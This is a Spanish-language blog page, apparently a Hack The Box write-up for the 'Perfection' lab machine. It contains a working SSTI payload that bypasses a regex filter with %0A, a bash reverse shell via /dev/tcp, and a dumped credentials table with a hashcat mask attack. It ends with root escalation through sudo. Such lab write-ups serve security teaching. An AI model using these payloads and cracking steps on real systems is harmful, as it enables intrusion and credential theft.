@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Perfection</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="../img/catIcon.webp" type="image/x-icon" />
+    <link rel="alternate" type="application/atom+xml" title="ruflas Atom Feed" href="https://ruflas.dev/weblog/atom.xml" />
+    <meta name="description" content="Perfection Writeup HTB" />
+    <script src="perfectionTranslate.js"></script>
+    <script>
+      function initTheme() {
+        var themeSwitcher = document.getElementById("checkbox");
+        var currentTheme = localStorage.getItem("theme");
+
+        if (!currentTheme) {
+          currentTheme = "whitestyles.css";
+          localStorage.setItem("theme", currentTheme);
+        }
+
+        document
+          .getElementById("theme-style")
+          .setAttribute("href", currentTheme);
+
+        themeSwitcher.checked = currentTheme === "darkstyles.css";
+      }
+
+      function toggleTheme() {
+        var themeSwitcher = document.getElementById("checkbox");
+        var theme = themeSwitcher.checked
+          ? "whitestyles.css"
+          : "darkstyles.css";
+        document.getElementById("theme-style").setAttribute("href", theme);
+        localStorage.setItem("theme", theme);
+      }
+
+      window.onload = function () {
+        initTheme();
+        var themeSwitcher = document.getElementById("checkbox");
+        themeSwitcher.addEventListener("change", toggleTheme);
+      }
+    </script>
+    <script defer src="https://stats.ruflas.dev/script.js" data-website-id="7aace55c-ceea-49f9-b041-38685370276a"></script>
+    <link
+      id="theme-style"
+      rel="stylesheet"
+      type="text/css"
+      href="whitestyles.css"
+    />
+  </head>
+  <body data-post-id="5">
+    <header>
+      <nav>
+        <ul class="nav-links">
+          <li><a id="navInicio" href="https://ruflas.dev">Inicio</a></li>
+          <li><a id="weblog" href="https://ruflas.dev/weblog/">Weblog</a></li>
+          <li><a id="now" href="https://ruflas.dev/now">Now</a></li>
+          <li>
+            <a href="https://ruflas.dev/weblog/atom.xml">
+              <img src="../img/rss.svg" alt="RSS Feed" class="rss-icon" />
+            </a>
+          </li>
+        </ul>
+        <div class="theme-switch-wrapper">
+          <label class="theme-switch" for="checkbox">
+            <input type="checkbox" id="checkbox" />
+            <div class="slider round" onclick="toggleTheme()"></div>
+          </label>
+        </div>
+      </nav>
+    </header>
+    <main>
+      <div class="post">
+        <h1 id="postTitle">Perfection Writeup</h1>
+        <h2 id="postDate" class="date">Publicado el 2 de marzo de 2024</h2>
+        <h3 id="authorInfo" class="info">
+          Maquina creada por <a href="https://app.hackthebox.com/users/1412009">TheHated1</a>
+        </h3>
+        <p id="linuxMachineIntro">
+          Esta máquina Linux se basa en el uso de una peticion con inyección de codigo (en concreto SSTI RCE haciendo un bypass a un regex filter usando el char %0A) para obtener una shell como usuario.
+        </p>
+        <p id="linuxMachinePrivEscInfo">
+          Una vez dentro de la máquina, encontramos un hash que utilizaremos para sacar la contraseña del usuario y ver que podemos hacer.</p>
+        <p id="portScanning">
+          Primero realizamos un escaneo de puertos a la máquina para ver qué servicios puede tener activos:
+        </p>
+        <code
+          >┌──(ruflas㉿kali)-[~]
+          <br>└─$ nmap -sCV 10.10.11.253                  
+          <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-02 20:35 CET
+          <br>Nmap scan report for 10.10.11.253
+          <br>Host is up (0.040s latency).
+          <br>Not shown: 998 closed tcp ports (conn-refused)
+          <br>PORT   STATE SERVICE VERSION
+          <br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+          <br>| ssh-hostkey: 
+          <br>|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
+          <br> |_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
+          <br>80/tcp open  http    nginx
+          <br>|_http-title: Weighted Grade Calculator
+          <br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+          <br>
+          <br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+          <br>Nmap done: 1 IP address (1 host up) scanned in 9.96 seconds          
+        </code>
+        <p id="portsOpen">
+          Podemos observar que tiene el puerto 80 (Servicio Apache) y el puerto 22 (SSH) abiertos.
+        </p>
+        <p id="webServiceAccess">Probamos a acceder al servicio web:</p>
+        <p id="directoryBuster">Pruebo a la vez a lanzar una busqueda de directorios para ver si encuentro algun panel de login o algo oculto.</p>
+        <p id="feroxbusterCommand">Ejecuto feroxbuster pero no encuentro nada interesante.</p>
+        <p id="calculator">Lo que podemos ver interesante es como hay una calculadora donde se nos pide introducir cinco asignaturas con sus respectivas calificaciones y peso en %.</p>
+        <p id="calculatorBackend">Al mirar al darle a submit que petición hace podemos observar como hace una peticioón POST a /weighted-grade-calc y si miramos en la url vemos como utiliza Sinatra que es un framework de Ruby.</p>
+        <div class="postimg" id="SinatraScreenshot">
+            <a href="../img/perf1.webp">
+              <img src="../img/perf1.webp" alt="Resultado de Sinatra." />
+            </a>
+        </div>
+        <p id="calculatorTest">Estuve probando a introducir valores no comunes en la calculadora, como seria valores negativos,demasiado altos o inyecciones de codigo en Ruby.</p>
+        <p id="calculatorTestResult">Lo que pude observar es que me devolvia "Malicious input blocked" lo que nos da a pensar que esta sanitizado en el backend los campos (en el frontend sabemos que si pero acabamos de verlo en el backend utilizando Burp Suite para modificar nuestras peticiones).</p>
+        <p id="calculatorTestResult2">Esto nos hace llegar a la conclusión de que probablemente tengamos que buscar la forma de forzar un RCE</p>
+        <p id="searchingRCE">Un usuario del foro de breachforums explico como podiamos hacer este bypass.</p>
+        <p id="searchingRCE2">El bypass consiste en utilizar el char %0A para saltar el regex filter que tiene el backend y pasar el codigo en base64 para evitar que salte el "Malicious input blocked".</p>
+        <p id="searchingRCE3">Usuario: jahman Comentario: "You have to bypass  a regex filter to execute SSTI RCE. You have to use the %0A char. here is a payload:"</p>
+        <code>category1=a///A77ss/e%0A;<%25%3d+system("echo {BASH REVERSE SHELL CODE BASE64} | base64 -d | bash")+%25>+</code>
+        <p id="searchingRCE4">Donde pone "BASH REVERSE SHELL CODE BASE64" iria nuestro codigo de reverse shell de bash codificado.</p>
+        <code>#/bin/bash
+        <br>bash -i >& /dev/tcp/IP/PORT 0>&1</code>
+        <div class="postimg" id="burpSuitScreenshot">
+            <a href="../img/perf2.webp">
+                <img src="../img/perf2.webp" alt="Payload en Burp Suit." />
+            </a>
+        </div>
+            <p id="searchingRCE5">Una vez que tenemos el payload, lo introducimos en la petición POST en Burp Suit y enviamos la petición mientras estamos previamente en escucha con netcat.</p>
+        <code>┌──(ruflas㉿kali)-[~]<br>└─$ sudo nc -lvnp 1234
+            <br>listening on [any] 1234 ...
+            <br>connect to [10.10.14.16] from (UNKNOWN) [10.10.11.253] 42960
+            <br>bash: cannot set terminal process group (988): Inappropriate ioctl for device
+            <br>bash: no job control in this shell
+            <br>susan@perfection:~/ruby_app$ ls /home
+            <br>ls /home
+            <br>susan
+        </code>
+        <p id="userFlagAcquisition">Una vez dentro de la máquina podemos obtener la flag de usuario y vemos que estamos como el usuario 'susan'.</p>
+        <code>susan@perfection:~/ruby_app$ cat /home/susan/user.txt
+            <br>cat /home/susan/user.txt
+            <br><div class="spoiler">55f11d7e66617af5dfc6aa1c5440ddf2</div>
+        </code>
+        <p id="userPersistence">Una vez que tenemos la flag de usuario, decidi guardar mi id_rsa.pub en la carpeta de susan de .ssh en el archivo authorized_keys para poder conectarme por ssh sin contraseña a susan</p>
+        <p id="privEscAttempt">Ahora ejecutamos "sudo -l" para ver si tenemos privilegios en algún archivo sin contraseña para escalar privilegios.</p>
+        <p id="sudoLResult">Podemos observar como nos pide la contraseña de susan la cual no tenemos.</p>
+        <p id="searchSudoExploit">En este punto probe a ejecutar linpeas.sh pero sin buscar mucho ya vemos como hay un archivo Migration/pupilpath_credentials.db que ya sea utilizando el comando strings o metiendonos con sqlite podemos ver el hash de la contraseña de susan</p>
+        <code>susan@perfection:~$ sqlite3 Migration/pupilpath_credentials.db 
+            <br>SQLite version 3.37.2 2022-01-06 13:25:41
+            <br>Enter ".help" for usage hints.
+            <br>sqlite> .tables
+            <br>users
+            <br>sqlite> select * from users;
+            <br>1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
+            <br>2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
+            <br>3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
+            <br>4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
+            <br>5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
+            <br>sqlite> .exit
+        </code>
+        <p id="hashObtention">Una vez que tenemos el hash de la contraseña de susan, utilizamos hashcat para crackearla, pero si antes de eso buscamos un poco mas podemos ver lo siguiente:</p>
+        <p id="hashObtention2">Mirando /var/spool/mail/susan podemos observar cual es la estructura de la contraseña, esto nos ayudara a hacer mucho mucho mas rapido el proceso de obtener la contraseña con hashcat.</p>
+        <code>{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}</code>
+        <p id="hashCrack">Una vez que tenemos la estructura de la contraseña, utilizamos hashcat para crackearla y obtenemos la contraseña de susan.</p>
+        <code>┌──(ruflas㉿kali)-[~/Perfection]<br>└─$ hashcat -m 1400 susanHash.txt -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d</code>
+        <p id="hashCrackPassword">La contraseña de susan es:</p>
+        <code><div class="spoiler">susan_nasus_413759210</div></code>
+        <p id="hashCrackResult">Una vez que tenemos la contraseña de susan ya podemos probar a ejecutar "sudo -l" con el usuario susan.</p>
+        <p id="susanSudoPermissions">Podemos observar que el usuario susan cuenta con todos los permisos asi que haciendo "sudo su" y poniendo la contraseña ya somos usuario root.</p>
+        <code>susan@perfection:~$ sudo -l
+            <br>[sudo] password for susan: 
+            <br>Matching Defaults entries for susan on perfection:
+            <br>    env_reset, mail_badpass,
+            <br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+            <br>
+            <br>User susan may run the following commands on perfection:
+            <br>    (ALL : ALL) ALL
+            <br>susan@perfection:~$ sudo su
+            <br>root@perfection:/home/susan# cat /root/root.txt 
+            <br><div class="spoiler">8f2defcbf16419c997ac3378e29363a6</div>
+        </code>
+        <p id="machineCompletion">Y ya hemos terminado la máquina Perfection ✅.</p>
+        <div class="postimg" id="machineCompletedScreenshot">
+          <a href="https://www.hackthebox.com/achievement/machine/403595/590">
+            <img src="../img/perf3.webp" alt="Owned Perfection✅" />
+          </a>
+        </div>
+      </div>
+    </main>
+    <section id="commentsSection">
+      <h2 id="commentsSectionTitle">Comentarios</h2>
+  
+      <form id="commentForm" onsubmit="postComment(event)">
+          <input type="text" id="nameInput" placeholder="Nombre" required />
+          <input type="text" id="websiteInput" placeholder="Sitio web" />
+          <textarea id="commentInput" placeholder="Comentario" required></textarea>
+          <button type="submit" id="submitButtonText">Publicar</button>
+      </form>
+  
+      <div id="commentsContainer"></div>
+  </section>
+  
+    <footer>
+      <p id="footerText">
+        © 2022-2025 ruflas | licensed under <a href="https://creativecommons.org/licenses/by-sa/4.0/" target="_blank">CC BY-SA</a> 😽
+      </p>
+    </footer>
+    <script src="code.js"></script>
+  </body>
+</html>
